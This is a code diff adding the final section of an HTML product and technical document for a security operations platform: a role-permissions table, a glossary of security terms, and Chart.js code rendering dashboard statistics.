+      <tr><td>View incidents</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td></tr>
+      <tr><td>Assign/close incidents</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Execute SOAR playbooks</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Block/Unblock IPs manually</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Isolate endpoints</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td></tr>
+      <tr><td colspan="7" style="background:#f1f5f9; font-weight:700; font-size:8.5pt; color:#334155; text-transform:uppercase; letter-spacing:1px;">Administration</td></tr>
+      <tr><td>Manage users</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Access all tenants</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Platform configuration</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     APPENDIX D — GLOSSARY
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Appendix D</div>
+    <div class="chapter-title">Glossary of Terms</div>
+    <div class="chapter-subtitle">Key terminology used throughout the AJNAT SOC platform documentation</div>
+  </div>
+
+  <table>
+    <thead><tr><th>Term</th><th>Definition</th></tr></thead>
+    <tbody>
+      <tr><td><strong>APT</strong></td><td>Advanced Persistent Threat — sophisticated, long-duration cyber attack, often nation-state sponsored</td></tr>
+      <tr><td><strong>C2 / C&amp;C</strong></td><td>Command and Control — infrastructure used by attackers to control compromised systems</td></tr>
+      <tr><td><strong>CVE</strong></td><td>Common Vulnerabilities and Exposures — standardized vulnerability identifier system</td></tr>
+      <tr><td><strong>DDoS</strong></td><td>Distributed Denial of Service — attack overwhelming a target using multiple distributed sources</td></tr>
+      <tr><td><strong>EDR</strong></td><td>Endpoint Detection and Response — security monitoring and response for endpoint devices</td></tr>
+      <tr><td><strong>FIM</strong></td><td>File Integrity Monitoring — real-time tracking of file system changes for tampering detection</td></tr>
+      <tr><td><strong>IOC</strong></td><td>Indicator of Compromise — evidence of a security incident (malicious IP, domain, file hash)</td></tr>
+      <tr><td><strong>IOA</strong></td><td>Indicator of Attack — behavioral patterns indicating an attack in progress</td></tr>
+      <tr><td><strong>IDS</strong></td><td>Intrusion Detection System — monitors network traffic and generates alerts on suspicious activity</td></tr>
+      <tr><td><strong>IPS</strong></td><td>Intrusion Prevention System — actively blocks detected threats in real time</td></tr>
+      <tr><td><strong>LFI</strong></td><td>Local File Inclusion — attack using path traversal to read local server files</td></tr>
+      <tr><td><strong>MITRE ATT&amp;CK</strong></td><td>Knowledge base of adversary tactics, techniques, and procedures (TTPs)</td></tr>
+      <tr><td><strong>MTTR</strong></td><td>Mean Time to Respond — average time from threat detection to resolution</td></tr>
+      <tr><td><strong>RBAC</strong></td><td>Role-Based Access Control — access permissions based on user role</td></tr>
+      <tr><td><strong>SIEM</strong></td><td>Security Information and Event Management — centralized log aggregation and correlation</td></tr>
+      <tr><td><strong>SOAR</strong></td><td>Security Orchestration, Automation, and Response — automated incident response workflows</td></tr>
+      <tr><td><strong>SQLi</strong></td><td>SQL Injection — attack inserting malicious SQL into application database queries</td></tr>
+      <tr><td><strong>SSRF</strong></td><td>Server-Side Request Forgery — tricking server into making requests to internal resources</td></tr>
+      <tr><td><strong>STIX/TAXII</strong></td><td>Standard formats for sharing structured threat intelligence</td></tr>
+      <tr><td><strong>TTP</strong></td><td>Tactics, Techniques, and Procedures — the methods used by a threat actor</td></tr>
+      <tr><td><strong>UEBA</strong></td><td>User and Entity Behavior Analytics — ML-based detection of behavioral anomalies</td></tr>
+      <tr><td><strong>WAF</strong></td><td>Web Application Firewall — Layer-7 firewall protecting web applications</td></tr>
+      <tr><td><strong>XDR</strong></td><td>Extended Detection and Response — unified security across endpoints, network, cloud, and identity</td></tr>
+      <tr><td><strong>XSS</strong></td><td>Cross-Site Scripting — injecting malicious scripts into web pages</td></tr>
+      <tr><td><strong>Zero-Trust</strong></td><td>Security model requiring verification for every user and device, with no implicit trust</td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     FOOTER
+═════════════════════════════════════════════════════════════ -->
+<div class="doc-footer">
+  <strong>AJNAT Security Technologies</strong> — Enterprise Product &amp; Technical Documentation v3.0 &nbsp;|&nbsp;
+  Classification: CONFIDENTIAL &nbsp;|&nbsp; Government Presentation Copy &nbsp;|&nbsp; 2025<br/>
+  <em>This document contains proprietary information. Distribution restricted to authorized personnel only.</em>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHARTS JAVASCRIPT
+═════════════════════════════════════════════════════════════ -->
+<script>
+const NAVY   = '#0a1628';
+const BLUE   = '#1e40af';
+const CYAN   = '#06b6d4';
+const GREEN  = '#10b981';
+const RED    = '#ef4444';
+const ORANGE = '#f59e0b';
+const PURPLE = '#8b5cf6';
+const PINK   = '#ec4899';
+const TEAL   = '#14b8a6';
+const LIME   = '#84cc16';
+const ROSE   = '#f43f5e';
+const INDIGO = '#6366f1';
+
+Chart.defaults.font.family = 'Inter, sans-serif';
+Chart.defaults.font.size = 9;
+
+// ── Event Volume Distribution ──
+new Chart(document.getElementById('eventVolumeChart'), {
+  type: 'doughnut',
+  data: {
+    labels: ['Network (IPS/IDS)', 'Endpoint (EDR)', 'SIEM Logs', 'WAF Events', 'Threat Intel', 'Identity/Auth'],
+    datasets: [{ data: [32, 25, 20, 10, 7, 6], backgroundColor: [NAVY, BLUE, CYAN, GREEN, ORANGE, PURPLE], borderWidth: 2, borderColor: '#fff' }]
+  },
+  options: { plugins: { legend: { position: 'right', labels: { font: { size: 9 } } } }, cutout: '55%' }
+});
+
+// ── Alert Severity Distribution ──
+new Chart(document.getElementById('alertSeverityChart'), {
+  type: 'bar',
+  data: {
+    labels: ['Critical', 'High', 'Medium', 'Low'],
+    datasets: [{ label: 'Alerts', data: [142, 387, 1024, 3291], backgroundColor: [RED, ORANGE, '#f59e0b', GREEN], borderRadius: 6 }]
+  },
+  options: { plugins: { legend: { display: false } }, scales: { y: { beginAtZero: true, grid: { color: '#f1f5f9' } }, x: { grid: { display: false } } } }
+});
+
+// ── EDR Events Chart ──
+new Chart(document.getElementById('edrEventsChart'), {
+  type: 'bar',
+  data: {
+    labels: ['Process', 'Network', 'File (FIM)', 'Registry', 'Auth', 'Memory', 'Script'],
+    datasets: [{ label: 'Daily Events', data: [45000, 32000, 18000, 8000, 12000, 3000, 6000], backgroundColor: [BLUE, CYAN, GREEN, ORANGE, PURPLE, RED, TEAL], borderRadius: 4 }]
+  },
+  options: { plugins: { legend: { display: false } }, scales: { y: { beginAtZero: true }, x: { grid: { display: false } } } }
+});
+
+// ── EDR Severity Chart ──
+new Chart(document.getElementById('edrSeverityChart'), {
+  type: 'pie',
+  data: {
+    labels: ['Critical', 'High', 'Medium', 'Low', 'Info'],
+    datasets: [{ data: [8, 23, 47, 156, 890], backgroundColor: [RED, ORANGE, '#f59e0b', GREEN, CYAN] }]
+  },
+  options: { plugins: { legend: { position: 'right', labels: { font: { size: 9 } } } } }
+});
+
+// ── IPS Attack Distribution ──
+new Chart(document.getElementById('ipsAttackDistChart'), {
+  type: 'bar',
+  data: {
+    labels: ['Brute Force', 'SQLi', 'XSS', 'Port Scan', 'DDoS', 'Botnet', 'Cmd Inject', 'Path Trav', 'Web Shell', 'Log4Shell', 'DNS Tunnel', 'SSRF', 'Malware'],
+    datasets: [{ label: 'Blocks (90d)', data: [4821, 3234, 2145, 1987, 1654, 1234, 987, 876, 543, 421, 312, 234, 198], backgroundColor: [ORANGE, RED, ROSE, CYAN, '#7c3aed', '#be185d', BLUE, TEAL, INDIGO, '#b91c1c', GREEN, PURPLE, '#d97706'], borderRadius: 4 }]
+  },
+  options: { indexAxis: 'y', plugins: { legend: { display: false } }, scales: { x: { beginAtZero: true, grid: { color: '#f1f5f9' } }, y: { grid: { display: false }, ticks: { font: { size: 8 } } } } }
+});
+
+// ── IPS Severity Breakdown ──
+new Chart(document.getElementById('ipsAttackSeverityChart'), {
+  type: 'doughnut',
+  data: {
+    labels: ['Critical (≥80)', 'High (55–79)', 'Medium (30–54)', 'Low (<30)'],
+    datasets: [{ data: [34, 41, 18, 7], backgroundColor: [RED, ORANGE, '#f59e0b', GREEN], borderWidth: 3, borderColor: '#fff' }]
+  },
+  options: { plugins: { legend: { position: 'bottom', labels: { font: { size: 9 } } } }, cutout: '50%' }
+});
+
+// ── IPS Base Score Chart ──
+new Chart(document.getElementById('ipsBaseScoreChart'), {
+  type: 'radar',
+  data: {
+    labels: ['SQLi', 'XSS', 'Botnet', 'DDoS', 'Malware', 'Log4Shell', 'Priv Esc', 'Cred Theft', 'SSRF', 'WebShell'],
+    datasets: [{
+      label: 'Base Score',
+      data: [75, 75, 80, 90, 75, 100, 75, 75, 75, 75],
+      backgroundColor: 'rgba(30,64,175,0.2)',
+      borderColor: BLUE,
+      pointBackgroundColor: BLUE,
+      pointRadius: 4
+    }]
+  },
+  options: { scales: { r: { beginAtZero: true, max: 100, ticks: { font: { size: 8 } } } }, plugins: { legend: { display: false } } }
+});
+
+// ── IPS Action Chart ──
+new Chart(document.getElementById('ipsActionChart'), {
+  type: 'line',
+  data: {
+    labels: ['Day 1', 'Day 5', 'Day 10', 'Day 15', 'Day 20', 'Day 25', 'Day 30'],
+    datasets: [
+      { label: 'Blocked', data: [312, 287, 401, 356, 423, 398, 445], borderColor: RED, backgroundColor: 'rgba(239,68,68,0.1)', fill: true, tension: 0.4 },
+      { label: 'Detected Only', data: [89, 102, 76, 134, 98, 112, 87], borderColor: ORANGE, backgroundColor: 'rgba(245,158,11,0.1)', fill: true, tension: 0.4 }
+    ]
+  },
+  options: { plugins: { legend: { position: 'top', labels: { font: { size: 9 } } } }, scales: { y: { beginAtZero: true }, x: { grid: { display: false } } } }
+});
+
+// ── WAF Attack Types Chart ──
+new Chart(document.getElementById('wafAttackChart'), {
+  type: 'bar',
+  data: {
+    labels: ['SQLi', 'XSS', 'Brute Force', 'Cmd Inject', 'Path Trav', 'SSRF', 'Web Shell'],
+    datasets: [{ label: 'Blocked (24h)', data: [234, 187, 432, 98, 156, 67, 43], backgroundColor: [RED, ROSE, ORANGE, BLUE, CYAN, PURPLE, TEAL], borderRadius: 6 }]
+  },
+  options: { plugins: { legend: { display: false } }, scales: { y: { beginAtZero: true }, x: { grid: { display: false }, ticks: { font: { size: 8 } } } } }
+});
+
+// ── WAF Trend Chart ──
+new Chart(document.getElementById('wafTrendChart'), {
+  type: 'line',
+  data: {
+    labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
+    datasets: [
+      { label: 'Clean Traffic', data: [45200, 43800, 47100, 46500, 48200, 31000, 29800], borderColor: GREEN, backgroundColor: 'rgba(16,185,129,0.1)', fill: true, tension: 0.4 },
+      { label: 'Blocked', data: [1240, 987, 1456, 1123, 1678, 876, 743], borderColor: RED, backgroundColor: 'rgba(239,68,68,0.1)', fill: true, tension: 0.4 }
+    ]
+  },
+  options: { plugins: { legend: { position: 'top', labels: { font: { size: 9 } } } }, scales: { y: { beginAtZero: true }, x: { grid: { display: false } } } }
+});
+
+// ── Threat Intel IOC Chart ──
+new Chart(document.getElementById('tiocChart'), {
+  type: 'bar',
+  data: {
+    labels: ['IP Addresses', 'Domains', 'File Hashes', 'URLs', 'CVEs'],
+    datasets: [{ label: 'TI Hits', data: [8234, 3456, 1987, 2341, 432], backgroundColor: [RED, ORANGE, BLUE, CYAN, PURPLE], borderRadius: 6 }]
+  },
+  options: { plugins: { legend: { display: false } }, scales: { y: { beginAtZero: true }, x: { grid: { display: false } } } }
+});
+
+// ── TI Source Chart ──
+new Chart(document.getElementById('tiSourceChart'), {
+  type: 'doughnut',
+  data: {
+    labels: ['AbuseIPDB', 'OTX AlienVault', 'Talos', 'VirusTotal', 'Shodan', 'MISP', 'Emerging Threats'],
+    datasets: [{ data: [28, 22, 18, 14, 9, 6, 3], backgroundColor: [RED, ORANGE, BLUE, CYAN, PURPLE, GREEN, TEAL] }]
+  },
+  options: { plugins: { legend: { position: 'right', labels: { font: { size: 8 } } } }, cutout: '45%' }
+});
+
+// ── Anomaly Trend Chart ──
+new Chart(document.getElementById('anomalyTrendChart'), {
+  type: 'line',
+  data: {
+    labels: ['Wk1', 'Wk2', 'Wk3', 'Wk4', 'Wk5', 'Wk6', 'Wk7', 'Wk8', 'Wk9', 'Wk10', 'Wk11', 'Wk12'],
+    datasets: [
+      { label: 'Anomalies Detected', data: [12, 18, 14, 23, 19, 31, 27, 15, 22, 34, 29, 38], borderColor: PURPLE, backgroundColor: 'rgba(139,92,246,0.15)', fill: true, tension: 0.4 },
+      { label: 'True Positives', data: [10, 16, 12, 20, 17, 28, 25, 13, 20, 31, 27, 35], borderColor: GREEN, tension: 0.4 }
+    ]
+  },
+  options: { plugins: { legend: { position: 'top', labels: { font: { size: 9 } } } }, scales: { y: { beginAtZero: true }, x: { grid: { display: false } } } }
+});
+
+// ── UEBA Chart ──
+new Chart(document.getElementById('uebaChart'), {
+  type: 'pie',
+  data: {
+    labels: ['Unusual Login Time', 'New Country Login', 'Mass Data Download', 'Privilege Abuse', 'After-Hours Access', 'Unusual App Usage'],
+    datasets: [{ data: [31, 24, 18, 14, 9, 4], backgroundColor: [RED, ORANGE, BLUE, CYAN, PURPLE, GREEN] }]
+  },
+  options: { plugins: { legend: { position: 'right', labels: { font: { size: 8 } } } } }
+});
+
+// ── MTTR Chart ──
+new Chart(document.getElementById('mttrChart'), {
+  type: 'bar',
+  data: {
+    labels: ['Critical', 'High', 'Medium', 'Low'],
+    datasets: [
+      { label: 'Auto-Response (sec)', data: [3, 8, 0, 0], backgroundColor: RED, borderRadius: 4 },
+      { label: 'Human Response (min)', data: [5, 15, 60, 480], backgroundColor: BLUE, borderRadius: 4 }
+    ]
+  },
+  options: { plugins: { legend: { position: 'top', labels: { font: { size: 9 } } } }, scales: { y: { beginAtZero: true }, x: { grid: { display: false } } } }
+});
+
+// ── Resolution Chart ──
+new Chart(document.getElementById('resolutionChart'), {
+  type: 'doughnut',
+  data: {
+    labels: ['Fully Automated', 'Assisted (AI+Human)', 'Manual Investigation'],
+    datasets: [{ data: [63, 24, 13], backgroundColor: [GREEN, BLUE, ORANGE], borderWidth: 3, borderColor: '#fff' }]
+  },
+  options: { plugins: { legend: { position: 'right', labels: { font: { size: 9 } } } }, cutout: '55%' }
+});
+
+// ── Compliance Coverage Chart ──
+new Chart(document.getElementById('complianceChart'), {
+  type: 'bar',
+  data: {
+    labels: ['ISO 27001', 'NIST CSF', 'PCI-DSS', 'SOC 2', 'GDPR', 'CIS v8'],
+    datasets: [{ label: 'Coverage %', data: [97, 95, 98, 94, 96, 99], backgroundColor: [BLUE, CYAN, GREEN, ORANGE, PURPLE, TEAL], borderRadius: 6 }]
+  },
+  options: { plugins: { legend: { display: false } }, scales: { y: { beginAtZero: true, max: 100, ticks: { callback: v => v+'%' } }, x: { grid: { display: false } } } }
+});
+
+// ── Maturity Chart ──
+new Chart(document.getElementById('maturityChart'), {
+  type: 'radar',
+  data: {
+    labels: ['Identify', 'Protect', 'Detect', 'Respond', 'Recover', 'Govern'],
+    datasets: [{
+      label: 'Maturity Score',
+      data: [4.5, 4.8, 4.9, 4.7, 4.4, 4.6],
+      backgroundColor: 'rgba(16,185,129,0.2)',
+      borderColor: GREEN,
+      pointBackgroundColor: GREEN,
+      pointRadius: 5
+    }]
+  },
+  options: { scales: { r: { beginAtZero: true, max: 5, ticks: { stepSize: 1 } } }, plugins: { legend: { display: false } } }
+});
+
+// ── Event Trend ──
+new Chart(document.getElementById('eventTrendChart'), {
+  type: 'line',
+  data: {
+    labels: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
+    datasets: [{ label: 'Events (M)', data: [7.2, 7.8, 8.1, 8.4, 9.0, 9.3, 9.8, 10.1, 9.7, 10.3, 10.5, 10.8], borderColor: BLUE, backgroundColor: 'rgba(30,64,175,0.1)', fill: true, tension: 0.4 }]
+  },
+  options: { plugins: { legend: { display: false } }, scales: { y: { beginAtZero: false, ticks: { callback: v => v+'M' } }, x: { grid: { display: false } } } }
+});
+
+// ── Latency Distribution ──
+new Chart(document.getElementById('latencyChart'), {
+  type: 'bar',
+  data: {
+    labels: ['<0.5s', '0.5-1s', '1-2s', '2-5s', '>5s'],
+    datasets: [{ label: 'Events %', data: [54, 28, 13, 4, 1], backgroundColor: [GREEN, CYAN, BLUE, ORANGE, RED], borderRadius: 4 }]
+  },
+  options: { plugins: { legend: { display: false } }, scales: { y: { beginAtZero: true, ticks: { callback: v => v+'%' } }, x: { grid: { display: false } } } }
+});
+
+// ── Uptime Chart ──
+new Chart(document.getElementById('uptimeChart'), {
+  type: 'bar',
+  data: {
+    labels: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
+    datasets: [{ label: 'Uptime %', data: [99.98, 99.95, 100, 99.97, 99.99, 100, 99.94, 99.98, 100, 99.97, 99.99, 100], backgroundColor: GREEN, borderRadius: 4 }]
+  },
+  options: { plugins: { legend: { display: false } }, scales: { y: { beginAtZero: false, min: 99.8, max: 100, ticks: { callback: v => v+'%' } }, x: { grid: { display: false }, ticks: { font: { size: 8 } } } } }
+});
+</script>
+</body>
+</html>
